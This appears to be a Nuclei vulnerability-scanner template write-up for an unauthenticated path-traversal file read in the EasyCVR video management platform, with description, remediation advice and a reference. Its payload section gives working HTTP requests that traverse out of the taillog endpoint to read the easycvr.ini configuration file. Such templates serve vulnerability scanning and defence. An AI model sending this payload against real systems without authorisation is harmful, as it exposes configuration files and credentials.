# Nuclei Template: EasyCVR Video Management - Arbitrary File Read
**Template ID:** easycvr-arbitrary-file-read
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`easycvr-arbitrary-file-read.yaml`)

## Vulnerability Information & PoC

## Description
The EasyCVR-video management platform taillog interface has an arbitrary file read vulnerability. Unauthenticated attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., which puts the website in an extremely insecure state.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /taillog/oxsecl/..\easycvr.ini HTTP/1.1
Host: {{Hostname}}
```

## Remediation
Ensure that the application does not allow directory traversal or access to sensitive files through web requests. Implement proper input validation and restrict access to critical files.

## References
- https://mp.weixin.qq.com/s?__biz=MzkyNDY3MTY3MA==&mid=2247486259&idx=1&sn=dd51ca8df3aa1533144b975b9bec3086
